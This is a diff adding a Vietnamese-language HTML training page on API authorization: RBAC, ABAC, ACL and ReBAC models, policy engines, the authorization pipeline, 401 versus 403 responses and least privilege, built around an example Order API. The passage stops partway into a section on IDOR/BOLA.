@@ -1,0 +1,1087 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>M06 · Authorization &amp; Security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<main class="content">
+
+<div class="page-head">
+  <div class="breadcrumb"><a href="index.html">Lộ trình</a> / Module 06</div>
+  <h1>Module 06 — Authorization &amp; Authentication Security</h1>
+  <p class="lead">Đăng nhập thành công mới chỉ là một nửa câu chuyện. Module này trả lời: <b>ai được làm gì trên tài nguyên nào</b> (authorization), quyết định đó được đặt <b>ở đâu</b> trong API, và những <b>tấn công phổ biến</b> nào nhắm vào login, session và token — cùng cách phòng vệ.</p>
+  <div class="meta-row">
+    <span class="chip">⏱ Full 2 giờ · Core 1.5 giờ (đọc lướt ABAC/ACL/ReBAC)</span>
+    <span class="chip">📥 Input: M01–M05, token/session/scope</span>
+    <span class="chip">➡️ Tiếp theo: <a href="m07-architecture.html">Module 07</a></span>
+  </div>
+</div>
+
+<div class="keypoints"><div class="kp-title">Sau bài này bạn sẽ</div><ul>
+<li>Phân biệt <b>permission, role, policy, scope, claim</b></li>
+<li>So sánh được <b>RBAC, ABAC, ACL, ReBAC</b> và biết khi nào dùng</li>
+<li>Vẽ được <b>pipeline phân quyền</b> trong API và trả đúng <b>401 / 403</b></li>
+<li>Viết policy + <b>resource-based authorization</b> trong ASP.NET Core</li>
+<li>Nhận diện <b>CSRF, XSS, AiTM, IDOR/BOLA, MFA fatigue</b>… và cách phòng vệ</li>
+<li>Áp dụng chính sách mật khẩu theo <b>NIST SP 800-63B-4</b></li>
+<li>Chọn nơi lưu token trong browser và hiểu vì sao nên dùng <b>BFF</b></li>
+</ul></div>
+
+<div class="eli5"><span class="eli5-title">Nói đơn giản — cả module trong một câu chuyện</span>
+Bảo vệ tòa nhà đã kiểm tra CCCD và phát thẻ cho bạn (<i>authentication</i> — đã học ở M01–M05). Module này là phần còn lại: <b>thẻ của bạn mở được cửa nào</b> (<i>authorization</i>), và <b>kẻ gian có những mánh gì</b> để mượn thẻ, làm giả thẻ hay lừa bạn quẹt thẻ hộ (<i>threats</i>).</div>
+
+<div class="callout info"><span class="callout-title">🎯 Mục tiêu module</span>
+Hiểu authorization là lớp quyết định quyền <b>độc lập</b> với authentication; phân tích được một request từ lúc xác minh token đến lúc ra quyết định cho phép/từ chối; nhận diện các lỗi thiết kế/cấu hình bảo mật phổ biến (CSRF, XSS, AiTM, token theft, IDOR…) và đề xuất được biện pháp giảm thiểu.</div>
+
+<h2 id="input">Input trước module</h2>
+<ul>
+<li>Hoàn thành <a href="m01-fundamentals.html">Module 01</a>–<a href="m05-enterprise-passwordless.html">05</a> và <a href="lab.html">Lab</a>.</li>
+<li>Hiểu token, session, claims, scope và các flow OAuth/OIDC (<a href="m02-crypto-session-token.html#tokens">M02</a>, <a href="m03-oauth-oidc.html">M03</a>).</li>
+<li>Có khái niệm về API middleware (pipeline ASP.NET Core) và role/permission.</li>
+</ul>
+
+<div class="callout example"><span class="callout-title">💡 Ví dụ xuyên suốt: “Order API” của công ty bán lẻ</span>
+<ul>
+<li><b>Order API</b> (ASP.NET Core, <code>aud = demo-api</code>) quản lý đơn hàng. Mỗi đơn có <code>OwnerId</code> (người tạo), <code>Department</code> (phòng ban) và <code>Amount</code>.</li>
+<li><b>An</b> (Employee, phòng Sales-HN) tạo đơn. <b>Bình</b> (Manager, phòng Sales-HN) duyệt đơn của phòng mình. <b>Chi</b> (Employee, phòng Sales-HCM).</li>
+<li>Client: SPA nội bộ và app WPF (lấy token qua Authorization Code + PKCE, xem <a href="m03-oauth-oidc.html#auth-code-pkce">M03</a>). Một <code>worker</code> service đồng bộ dữ liệu bằng Client Credentials.</li>
+</ul>
+Đây chính là API ở <a href="lab.html#lab2">Lab 2</a>, được mở rộng thêm phần phân quyền.</div>
+
+<!-- ===================================================== -->
+<h2 id="authz-models">A. Authorization models</h2>
+
+<h3 id="building-blocks">A.1. Permission, Role, Policy, Scope, Claim <span class="badge must">Must</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Nghĩ tới thẻ ra vào công ty. <b>Claim</b> là thông tin in trên thẻ (tên, phòng ban). <b>Permission</b> là “được mở cửa kho”. <b>Role</b> là “gói quyền” theo chức danh (thẻ Trưởng phòng mở được nhiều cửa hơn). <b>Policy</b> là nội quy (“kho chỉ mở trong giờ hành chính”). <b>Scope</b> giống <b>giấy ủy quyền</b> bạn đưa cho người giao hàng: “chỉ được lấy bưu kiện ở lễ tân” — dù bạn là Trưởng phòng, người cầm giấy cũng chỉ làm được đúng việc ghi trên giấy.</div>
+
+<p>Năm khái niệm này hay bị dùng lẫn lộn. Cách nhớ: <b>claim</b> là <i>dữ kiện</i>, <b>permission</b> là <i>quyền</i>, <b>role</b> là <i>gói quyền</i>, <b>scope</b> là <i>giới hạn của client</i>, <b>policy</b> là <i>quy tắc ra quyết định</i>.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>Khái niệm</th><th>Định nghĩa</th><th>Ví dụ trong Order API</th><th>Ai/cái gì quản lý</th></tr></thead>
+<tbody>
+<tr><td><b>Permission</b></td><td>Quyền thực hiện một <i>hành động</i> trên một <i>loại tài nguyên</i>.</td><td><code>order:read</code>, <code>order:approve</code></td><td>Ứng dụng định nghĩa</td></tr>
+<tr><td><b>Role</b></td><td>Tập hợp permission, gán cho user hoặc group.</td><td><code>Manager</code> = {order:read, order:approve}; <code>Employee</code> = {order:read, order:create}</td><td>Admin ứng dụng / IdP (group → role)</td></tr>
+<tr><td><b>Policy</b></td><td>Quy tắc cho phép/từ chối dựa trên subject, action, resource và context.</td><td>“Manager chỉ duyệt đơn <i>cùng phòng ban</i>, không duyệt đơn của chính mình, tối đa 50 triệu”</td><td>Code ứng dụng hoặc policy engine</td></tr>
+<tr><td><b>Scope</b></td><td>Phạm vi quyền mà <b>client</b> được cấp (thường với sự đồng ý của user) trong OAuth.</td><td>Access token có <code>scope="orders.read"</code> → client này chỉ được <i>đọc</i> đơn thay mặt user</td><td>Authorization Server cấp theo cấu hình client + consent</td></tr>
+<tr><td><b>Claim</b></td><td>Một mẩu thông tin (cặp tên–giá trị) trong token/assertion.</td><td><code>sub</code>, <code>department: "Sales-HN"</code>, <code>roles: ["Manager"]</code>, <code>exp</code></td><td>IdP phát hành; API đọc</td></tr>
+</tbody></table></div>
+
+<div class="callout warn"><span class="callout-title">⚠️ Scope không thay thế authorization nghiệp vụ</span>
+Scope trả lời <b>“client này được phép làm thay user những loại việc gì?”</b>, không trả lời <b>“user này có quyền với đơn hàng #1024 không?”</b>.
+<ul>
+<li>Token của An có <code>orders.read</code> → SPA được gọi <code>GET /orders/{id}</code> thay An. Nhưng An vẫn <b>không</b> được đọc đơn của phòng HCM — đó là quyết định của API dựa trên ownership/department.</li>
+<li>Role <code>Manager</code> của Bình nói lên <b>Bình là ai trong tổ chức</b>. Nếu Bình đăng nhập vào một app “đọc báo cáo” chỉ được cấp <code>orders.read</code>, app đó vẫn <b>không</b> được duyệt đơn thay Bình dù Bình là Manager.</li>
+<li><b>Ownership</b> (“đơn này do An tạo”) không nằm trong token — API phải tra dữ liệu tài nguyên.</li>
+</ul>
+Quyền hiệu lực ≈ <b>(scope của client) ∩ (quyền của user) ∩ (rule trên tài nguyên cụ thể)</b>.</div>
+
+<div class="diagram">
+<pre class="mermaid">
+flowchart TD
+  T["Access token<br/>sub=an, scope=orders.read<br/>roles=Employee, department=Sales-HN"]
+  T --> S{"Scope có<br/>orders.read?"}
+  S -- "không" --> D1["403"]
+  S -- "có" --> R{"Role/permission<br/>cho phép đọc đơn?"}
+  R -- "không" --> D2["403"]
+  R -- "có" --> O{"Order 1024: OwnerId=an<br/>hoặc cùng phòng + Manager?"}
+  O -- "không" --> D3["403 hoặc 404"]
+  O -- "có" --> OK["200 OK"]
+</pre>
+<div class="caption">Ba lớp kiểm tra khác nhau: scope (client được ủy quyền gì) → role (user là ai) → ownership/business rule (tài nguyên cụ thể).</div>
+</div>
+
+<div class="callout tip"><span class="callout-title">✅ Không phải claim nào cũng là quyền</span>
+<code>email</code>, <code>name</code>, <code>locale</code> là thông tin mô tả. Đừng viết policy “email kết thúc bằng <code>@company.com</code> thì là nhân viên” — email có thể thay đổi, có thể chưa xác minh, có thể bị IdP khác phát hành. Chỉ dùng claim làm căn cứ phân quyền khi bạn biết <b>ai phát hành</b>, <b>có được xác minh</b> và <b>ý nghĩa ổn định</b> của nó (xem <a href="m03-oauth-oidc.html#iss-sub">định danh bằng iss + sub</a>).</div>
+
+<h3 id="rbac">A.2. RBAC — Role-Based Access Control <span class="badge must">Must</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+RBAC (phân quyền theo vai trò) giống <b>thẻ màu</b> ở công ty: thẻ xanh = nhân viên, thẻ vàng = trưởng phòng, thẻ đỏ = admin. Cửa nào cũng chỉ hỏi “thẻ màu gì?”. Dễ quản lý — nhưng cửa không biết bạn thuộc <i>phòng nào</i> hay đang <i>mấy giờ</i>.</div>
+<p>Quyền gắn với <b>role</b>; user (hoặc group) được gán role. Khi kiểm tra, hệ thống hỏi “user có role X không?” hoặc tốt hơn “role của user có permission Y không?”.</p>
+<div class="diagram">
+<pre class="mermaid">
+flowchart LR
+  subgraph Users
+    An["👤 An"]
+    Binh["👤 Bình"]
+    Admin1["👤 Dũng"]
+  end
+  subgraph Roles
+    E["Employee"]
+    M["Manager"]
+    A["Admin"]
+  end
+  subgraph Permissions
+    P1["order:create"]
+    P2["order:read"]
+    P3["order:approve"]
+    P4["user:manage"]
+  end
+  An --> E
+  Binh --> M
+  Admin1 --> A
+  E --> P1
+  E --> P2
+  M --> P2
+  M --> P3
+  A --> P4
+</pre>
+<div class="caption">RBAC: User → Role → Permission. Thay đổi quyền của cả nhóm chỉ cần sửa role.</div>
+</div>
+<div class="grid cols-2">
+<div class="card ok"><h4>👍 Ưu điểm</h4><p>Dễ hiểu, dễ audit (“ai có role Admin?”), khớp với cơ cấu tổ chức rõ ràng; hầu hết IdP (Entra app roles, Keycloak realm/client roles) và framework (<code>[Authorize(Roles="Manager")]</code>) hỗ trợ sẵn.</p></div>
+<div class="card bad"><h4>👎 Nhược điểm</h4><p><b>Role explosion</b>: khi cần điều kiện theo context, số role phình ra (<code>Manager_SalesHN</code>, <code>Manager_SalesHCM</code>, <code>Manager_SalesHN_Under50M</code>…). Không biểu diễn được “chỉ đơn của chính mình” hay “trong giờ làm việc”.</p></div>
+</div>
+<div class="callout tip"><span class="callout-title">💡 Mẹo thiết kế</span>
+Trong code, nên kiểm tra <b>permission</b> (<code>order:approve</code>) thay vì kiểm tra trực tiếp tên role ở khắp nơi. Khi tổ chức thêm role “Deputy Manager”, bạn chỉ sửa ánh xạ role → permission, không sửa code.</div>
+
+<h3 id="abac">A.3. ABAC — Attribute-Based Access Control <span class="badge should">Should</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+ABAC (phân quyền theo thuộc tính) giống một <b>bảo vệ đọc nội quy</b> chứ không chỉ nhìn màu thẻ: “Người của phòng Sales, vào kho của phòng Sales, trong giờ hành chính, đi cùng thiết bị công ty → cho vào”. Linh hoạt hơn nhiều, nhưng nội quy càng dài thì càng khó kiểm tra ai thực sự vào được đâu.</div>
+<p>Quyết định dựa trên <b>thuộc tính</b> của 4 nhóm: <b>subject</b> (phòng ban, cấp bậc), <b>resource</b> (phòng ban sở hữu, mức nhạy cảm), <b>action</b> (read/approve) và <b>environment</b> (giờ, IP, thiết bị, mức rủi ro).</p>
+<div class="diagram">
+<pre class="mermaid">
+flowchart LR
+  S["Subject attributes<br/>department=Sales-HN<br/>title=Employee"]
+  R["Resource attributes<br/>order.department=Sales-HN<br/>classification=internal"]
+  A["Action<br/>read"]
+  E["Environment<br/>time=10:30, device=managed"]
+  S --> P{"Policy ABAC"}
+  R --> P
+  A --> P
+  E --> P
+  P --> D["Permit / Deny"]
+</pre>
+<div class="caption">ABAC: policy là một biểu thức trên thuộc tính, không phải danh sách cứng.</div>
+</div>
+<pre data-title="Policy ABAC (pseudo-code)"><code class="language-plaintext">PERMIT action == "read" ON Order
+  WHEN subject.department == resource.department
+   AND environment.hour BETWEEN 8 AND 18
+   AND environment.deviceCompliant == true</code></pre>
+<p><b>Ưu:</b> rất linh hoạt, một policy thay cho hàng chục role. <b>Nhược:</b> policy phức tạp, khó trả lời câu hỏi audit “ai có thể đọc đơn #1024?”, phụ thuộc chất lượng thuộc tính (thuộc tính <code>department</code> sai/lỗi thời → quyết định sai).</p>
+
+<h3 id="acl">A.4. ACL — Access Control List <span class="badge should">Should</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+ACL (danh sách kiểm soát truy cập) giống <b>tờ danh sách dán trên cửa từng phòng</b>: “Phòng họp 3: An, Bình được vào”. Muốn biết ai vào được phòng nào thì phải đi đọc từng cửa.</div>
+<p>Danh sách quyền gắn <b>trực tiếp với từng tài nguyên</b>: “trên tài nguyên X, chủ thể Y được làm Z”. Đây là mô hình của file system NTFS, Google Drive “chia sẻ với…”, S3 bucket ACL.</p>
+<div class="diagram">
+<pre class="mermaid">
+flowchart LR
+  F1["📄 Báo cáo Q3.xlsx"] --> L1["ACL<br/>An: read, write<br/>Nhóm Sales-HN: read"]
+  F2["📁 Folder Hợp đồng"] --> L2["ACL<br/>Nhóm Legal: modify<br/>Bình: read"]
+</pre>
+<div class="caption">ACL: mỗi tài nguyên mang danh sách (chủ thể → quyền) của riêng nó.</div>
+</div>
+<p><b>Ưu:</b> phù hợp khi quyền khác nhau theo <i>từng</i> tài nguyên cụ thể, dễ hiểu với người dùng cuối (“chia sẻ file”). <b>Nhược:</b> khó quản lý ở quy mô lớn (hàng triệu entry), khó trả lời “An có quyền gì trên toàn hệ thống?”, dễ sót khi offboarding.</p>
+
+<h3 id="rebac">A.5. ReBAC — Relationship-Based Access Control <span class="badge should">Should</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+ReBAC (phân quyền theo quan hệ) giống câu “<b>bạn của bạn tôi</b> thì được vào nhà”: quyền suy ra từ chuỗi quan hệ (sếp của nhóm → nhóm sở hữu tài liệu → được xem tài liệu). Đó là cách Google Drive cho bạn mở file nằm trong folder được chia sẻ.</div>
+<p>Quyền suy ra từ <b>quan hệ</b> giữa các thực thể trong một đồ thị: owner, member, manager, parent folder… Ví dụ: “Bình được duyệt đơn vì Bình là <i>manager</i> của <i>team</i> mà An là <i>member</i>, và An là <i>owner</i> của đơn”.</p>
+<div class="diagram">
+<pre class="mermaid">
+flowchart LR
+  Binh["👤 Bình"] -- "manager of" --> Team["🏢 team:sales-hn"]
+  An["👤 An"] -- "member of" --> Team
+  An -- "owner of" --> O["🧾 order:1024"]
+  O -- "belongs to" --> Team
+  Q["❓ Bình approve order:1024?"] -.-> R["✅ Có: Bình là manager<br/>của team sở hữu đơn"]
+</pre>
+<div class="caption">ReBAC: duyệt đồ thị quan hệ để trả lời câu hỏi phân quyền.</div>
+</div>
+<p>Mô hình nổi tiếng là <b>Google Zanzibar</b> (hệ thống phân quyền dùng cho Drive, YouTube…), lưu quan hệ dạng <i>tuple</i> kiểu <code>order:1024#owner@user:an</code>. <b>Ưu:</b> tự nhiên cho ứng dụng cộng tác, chia sẻ, phân cấp folder/tổ chức. <b>Nhược:</b> cần hạ tầng lưu và truy vấn đồ thị, phải đồng bộ quan hệ từ dữ liệu nghiệp vụ.</p>
+
+<h3 id="policy-based">A.6. Policy-based access và policy engine <span class="badge should">Should</span> <span class="badge nice">Nice</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Thay vì mỗi bảo vệ tự nhớ nội quy, công ty đặt <b>một phòng pháp chế</b>: bảo vệ ở cửa (PEP) gọi điện hỏi “cho người này vào kho không?”, phòng pháp chế (PDP) tra bộ nội quy chung và trả lời “có/không”. Sửa nội quy một chỗ, mọi cửa đều áp dụng.</div>
+<p><b>Policy-based access control</b>: quyết định được đưa ra bởi các policy <b>tập trung</b>, tách khỏi code nghiệp vụ, có thể phối hợp RBAC/ABAC/ReBAC. Kiến trúc thường gặp tách hai vai trò:</p>
+<ul>
+<li><b>PEP</b> (Policy Enforcement Point): nơi <i>thực thi</i> — middleware/endpoint của API.</li>
+<li><b>PDP</b> (Policy Decision Point): nơi <i>ra quyết định</i> — policy engine trả về permit/deny.</li>
+</ul>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant C as Client
+  participant API as Order API (PEP)
+  participant PDP as Policy engine (PDP)
+  participant DB as Order DB
+  C->>API: POST /orders/1024/approve + access token
+  API->>API: Xác minh token (authN)
+  API->>DB: Tải order 1024
+  API->>PDP: Bình có được approve order 1024?
+  Note over API,PDP: Gửi kèm subject, action,<br/>thuộc tính đơn (dept, amount, owner)
+  PDP-->>API: deny (vượt hạn mức)
+  API-->>C: 403 Forbidden
+</pre>
+<div class="caption">PEP hỏi PDP. Code nghiệp vụ không chứa if/else phân quyền rải rác.</div>
+</div>
+<div class="table-wrap"><table>
+<thead><tr><th>Engine <span class="badge nice">Nice</span></th><th>Ý tưởng</th><th>Không phải là</th></tr></thead>
+<tbody>
+<tr><td><b>OPA</b> (Open Policy Agent)</td><td>Policy engine đa dụng, viết policy bằng ngôn ngữ <b>Rego</b>; dùng cho API, Kubernetes admission, CI…</td><td>Không phải IdP, không xác thực người dùng.</td></tr>
+<tr><td><b>Cedar</b></td><td>Ngôn ngữ policy mã nguồn mở do AWS phát triển (dùng trong Amazon Verified Permissions); hỗ trợ cả kiểu RBAC và ABAC.</td><td>Không phải dịch vụ đăng nhập.</td></tr>
+<tr><td><b>OpenFGA</b> / SpiceDB</td><td>Hệ thống ReBAC lấy cảm hứng từ <b>Google Zanzibar</b>: lưu tuple quan hệ, trả lời “user X có quan hệ Y với object Z không?”.</td><td>Không thay thế việc xác minh token.</td></tr>
+</tbody></table></div>
+<p>Trong lộ trình 15 giờ chỉ cần <b>nhận diện use case</b>: khi policy phức tạp, dùng chung giữa nhiều service hoặc cần audit tập trung thì cân nhắc policy engine; còn lại, policy của ASP.NET Core là đủ.</p>
+
+<h3 id="authz-compare">A.7. Bảng so sánh RBAC, ABAC, ACL, ReBAC (deliverable 1)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>RBAC</th><th>ABAC</th><th>ACL</th><th>ReBAC</th></tr></thead>
+<tbody>
+<tr><td>Quyền gắn với</td><td>Role</td><td>Biểu thức trên thuộc tính</td><td>Từng tài nguyên</td><td>Quan hệ trong đồ thị</td></tr>
+<tr><td>Câu hỏi điển hình</td><td>“User có role Manager?”</td><td>“Cùng phòng ban và trong giờ làm việc?”</td><td>“File X có cho An đọc không?”</td><td>“An có phải owner/member của…?”</td></tr>
+<tr><td>Ví dụ Order API</td><td>Manager được duyệt đơn</td><td>Chỉ đọc đơn cùng department, thiết bị được quản lý</td><td>Đơn 1024 chia sẻ cho kế toán Hoa</td><td>Manager của team sở hữu đơn được duyệt</td></tr>
+<tr><td>Độ chi tiết</td><td>Thô (coarse)</td><td>Rất mịn, theo context</td><td>Mịn theo tài nguyên</td><td>Mịn, theo quan hệ, kế thừa</td></tr>
+<tr><td>Ưu điểm</td><td>Đơn giản, dễ audit, hỗ trợ sẵn</td><td>Linh hoạt, ít role</td><td>Trực quan khi chia sẻ tài nguyên</td><td>Tự nhiên cho cộng tác, phân cấp</td></tr>
+<tr><td>Nhược điểm</td><td>Role explosion, không biểu diễn ownership/context</td><td>Policy phức tạp, khó audit, phụ thuộc chất lượng thuộc tính</td><td>Khó quản lý quy mô lớn, khó tổng hợp quyền</td><td>Cần hạ tầng đồ thị, đồng bộ quan hệ</td></tr>
+<tr><td>Phù hợp</td><td>Hệ thống nội bộ, cơ cấu vai trò rõ</td><td>Yêu cầu compliance, điều kiện động</td><td>File system, tài liệu chia sẻ</td><td>SaaS cộng tác (Drive, Notion, GitHub)</td></tr>
+</tbody></table></div>
+<div class="callout info"><span class="callout-title">ℹ️ Thực tế: thường kết hợp</span>
+Hệ thống thật hiếm khi dùng một mô hình thuần túy. Order API dùng <b>RBAC</b> (Manager) + <b>ABAC</b> (cùng department, hạn mức) + <b>ownership</b> (một dạng ReBAC đơn giản). Đây cũng là case study “API cần phân quyền theo ownership và department” ở <a href="m07-architecture.html#case-studies">Module 07</a>.</div>
+
+<!-- ===================================================== -->
+<h2 id="api-authz">B. Authorization trong API <span class="badge must">Must</span></h2>
+
+<h3 id="authz-pipeline">B.1. Pipeline từ request đến quyết định</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Giống đi vào ngân hàng rút tiền: (1) cổng kiểm tra <b>thẻ có thật và còn hạn</b> không (authentication); (2) quầy kiểm tra bạn có <b>loại tài khoản</b> được rút tiền mặt không (coarse-grained: role/scope); (3) giao dịch viên kiểm tra <b>tài khoản này có phải của bạn</b> không (fine-grained: ownership); (4) cuối cùng kiểm tra <b>số dư và hạn mức</b> (business rule). Trượt ở bước nào thì dừng ở bước đó.</div>
+<p><b>Coarse-grained</b> (phân quyền “thô”) kiểm tra theo <i>loại</i> — có role/scope không. <b>Fine-grained</b> (phân quyền “mịn”) kiểm tra theo <i>từng tài nguyên cụ thể</i> — đơn #1024 có phải của bạn không.</p>
+<div class="diagram">
+<pre class="mermaid">
+flowchart TD
+  A["HTTP request<br/>Authorization: Bearer eyJ..."] --> B["Authentication middleware<br/>xác minh chữ ký, iss, aud, exp, alg"]
+  B -- "không có / sai token" --> X1["401 Unauthorized<br/>+ WWW-Authenticate"]
+  B -- "hợp lệ → ClaimsPrincipal" --> C["Authorization policy (coarse-grained)<br/>scope, role, authenticated user"]
+  C -- "thiếu scope/role" --> X2["403 Forbidden"]
+  C -- "đạt" --> D["Tải tài nguyên<br/>(order 1024)"]
+  D -- "không tồn tại" --> X3["404 Not Found"]
+  D --> E["Resource-based authorization (fine-grained)<br/>ownership, department"]
+  E -- "không đạt" --> X4["403 (hoặc 404 để không lộ tồn tại)"]
+  E -- "đạt" --> F["Business rule<br/>hạn mức, trạng thái, không tự duyệt"]
+  F -- "vi phạm" --> X5["403 hoặc 409/422 tùy ngữ nghĩa"]
+  F -- "đạt" --> G["✅ Thực thi + ghi audit log"]
+</pre>
+<div class="caption">Coarse-grained (role/scope) có thể kiểm tra trước khi đọc dữ liệu; fine-grained (resource/business) chỉ kiểm tra được sau khi tải tài nguyên.</div>
+</div>
+<div class="table-wrap"><table>
+<thead><tr><th>Tầng</th><th>Hỏi gì</th><th>Dữ liệu cần</th><th>ASP.NET Core</th></tr></thead>
+<tbody>
+<tr><td>Authentication</td><td>Token có hợp lệ? Ai gọi?</td><td>Token + JWKS của IdP</td><td><code>AddJwtBearer</code>, <code>UseAuthentication()</code></td></tr>
+<tr><td>Coarse-grained</td><td>Client có scope? User có role/permission loại này?</td><td>Claims trong token</td><td><code>[Authorize(Policy=...)]</code>, <code>RequireAuthorization("...")</code></td></tr>
+<tr><td>Fine-grained</td><td>Với <i>tài nguyên này</i>, user có quyền?</td><td>Claims + dữ liệu tài nguyên</td><td><code>IAuthorizationService.AuthorizeAsync(user, resource, requirement)</code></td></tr>
+<tr><td>Business rule</td><td>Hành động có hợp lệ về nghiệp vụ?</td><td>Trạng thái, hạn mức, lịch sử</td><td>Trong handler hoặc domain service</td></tr>
+</tbody></table></div>
+
+<h3 id="401-vs-403">B.2. 401 vs 403 chi tiết</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+<b>401</b>: bảo vệ nói “<i>Tôi không biết anh là ai</i> — xuất trình thẻ (hợp lệ) đi”. <b>403</b>: bảo vệ nói “<i>Tôi biết anh là ai rồi</i>, nhưng anh không được vào phòng này”. Đưa lại cùng tấm thẻ lần nữa không giúp gì với 403.</div>
+<p>Nhắc lại từ <a href="m01-fundamentals.html#401-403">M01</a>: 401 = thất bại ở <b>authentication</b>, 403 = đã xác thực nhưng thất bại ở <b>authorization</b>. Với Bearer token, <a href="https://www.rfc-editor.org/rfc/rfc6750#section-3.1">RFC 6750 §3.1</a> định nghĩa mã lỗi trong header <code>WWW-Authenticate</code>:</p>
+<div class="table-wrap"><table>
+<thead><tr><th>Tình huống</th><th>Status</th><th>Header gợi ý (RFC 6750)</th></tr></thead>
+<tbody>
+<tr><td>Không gửi token</td><td><code>401</code></td><td><code>WWW-Authenticate: Bearer</code> (không kèm mã lỗi)</td></tr>
+<tr><td>Token hết hạn, sai chữ ký, sai <code>aud</code>/<code>iss</code></td><td><code>401</code></td><td><code>Bearer error="invalid_token"</code></td></tr>
+<tr><td>Request sai định dạng (thiếu tham số, gửi token 2 cách)</td><td><code>400</code></td><td><code>Bearer error="invalid_request"</code></td></tr>
+<tr><td>Token hợp lệ nhưng thiếu scope</td><td><code>403</code></td><td><code>Bearer error="insufficient_scope", scope="orders.write"</code></td></tr>
+<tr><td>Token hợp lệ, đủ scope nhưng không phải chủ đơn</td><td><code>403</code> (hoặc <code>404</code>)</td><td>Không cần header; body có thể là ProblemDetails</td></tr>
+</tbody></table></div>
+<pre data-title="Ví dụ response"><code class="language-plaintext">HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer error="invalid_token", error_description="The token expired at '11/10/2026 09:12:00'"
+
+HTTP/1.1 403 Forbidden
+WWW-Authenticate: Bearer error="insufficient_scope", scope="orders.write"</code></pre>
+<div class="callout info"><span class="callout-title">ℹ️ Chi tiết thực tế</span>
+<ul>
+<li>ASP.NET Core <code>JwtBearer</code> tự trả <code>401</code> kèm <code>error="invalid_token"</code> và mô tả lỗi (có thể tắt bằng <code>IncludeErrorDetails = false</code> để không lộ thông tin). Với 403, mặc định chỉ trả status — nếu muốn kèm <code>insufficient_scope</code> phải tự thêm (vd qua <code>JwtBearerEvents.OnForbidden</code>).</li>
+<li>Trả <code>404</code> thay vì <code>403</code> cho tài nguyên không thuộc quyền là lựa chọn hợp lệ khi việc <b>lộ sự tồn tại</b> của tài nguyên đã là rò rỉ thông tin (GitHub làm vậy với repo private). Hãy nhất quán trong toàn API.</li>
+<li>Với web app dùng cookie, “401” thường biểu hiện thành <b>redirect tới trang login</b> (challenge) và “403” thành redirect tới trang <i>Access Denied</i> (forbid). API thì nên trả status code thật, không redirect.</li>
+</ul></div>
+
+<h3 id="deny-by-default">B.3. Deny by default và least privilege</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+<b>Deny by default</b> (mặc định từ chối): tòa nhà mới xây thì mọi cửa đều <b>khóa sẵn</b>, ai cần mới được cấp quyền — thay vì để mở hết rồi nhớ đi khóa từng cửa. <b>Least privilege</b> (quyền tối thiểu): nhân viên dọn vệ sinh có chìa khóa phòng vệ sinh, không cần chìa két sắt.</div>
+<div class="grid cols-2">
+<div class="card acc"><span class="icon">🚫</span><h4>Deny by default</h4><p>Nếu không có quy tắc nào cho phép → <b>từ chối</b>. Endpoint mới thêm vào mà quên <code>[Authorize]</code> vẫn phải được bảo vệ. Trong ASP.NET Core: đặt <code>FallbackPolicy</code> yêu cầu user đã xác thực, và đánh dấu <code>[AllowAnonymous]</code> có chủ đích cho endpoint công khai.</p></div>
+<div class="card acc"><span class="icon">🤏</span><h4>Least privilege</h4><p>Cấp <b>ít quyền nhất đủ dùng</b>: client SPA đọc báo cáo chỉ xin <code>orders.read</code>; service <code>worker</code> chỉ có scope nó cần; DB account của API không có quyền <code>DROP</code>; admin dùng tài khoản riêng cho thao tác quản trị.</p></div>
+</div>
+
+<h3 id="ui-not-enough">B.4. Ẩn nút trên UI là không đủ</h3>
+<p>Ẩn nút “Duyệt” với An là <b>trải nghiệm người dùng</b>, không phải bảo mật. Bất kỳ ai có token đều có thể gọi API trực tiếp bằng curl/Postman/DevTools, hoặc sửa JavaScript của SPA. API là <b>trust boundary</b>: mọi quyết định phải được kiểm tra lại ở server.</p>
+<pre data-title="An tự gọi API dù không có nút"><code class="language-bash"># An mở DevTools, copy access token của chính mình rồi gọi:
+curl -X POST https://api.example.com/orders/1024/approve \
+     -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIs..."
+# API PHẢI trả 403 — vì An không phải Manager.</code></pre>
+<div class="callout danger"><span class="callout-title">⛔ Không tin dữ liệu phân quyền do client gửi lên</span>
+Đừng nhận <code>{"role":"Manager"}</code> hay <code>X-User-Id: 57</code> trong body/header từ client. Role/subject phải lấy từ <b>token đã xác minh</b> (hoặc từ DB theo <code>sub</code>), không phải từ những gì UI tự khai báo.</div>
+
+<h3 id="idor-bola">B.5. IDOR / BOLA — lỗi phân quyền số 1 của API</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Bạn gửi áo ở tủ đồ siêu thị, nhận phiếu số 15. Bạn đưa phiếu số <b>16</b> và nhân viên đưa luôn túi của người khác mà <b>không kiểm tra</b> phiếu có phải của bạn không. Đó là IDOR/BOLA: hệ thống tin vào con số bạn đưa, không kiểm tra quyền sở hữu.</div>
+<p><b>IDOR</b> (Insecure Direct Object Reference) hay <b>BOLA</b> (Broken Object Level Authorization) là khi API nhận ID tài nguyên từ client và trả dữ liệu <b>mà không kiểm tra người gọi có quyền với object đó</b>. BOLA đứng đầu <a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/">OWASP API Security Top 10 2023 (API1:2023)</a>.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant Chi as Chi (Sales-HCM)
+  participant API as Order API
+  participant DB as Database
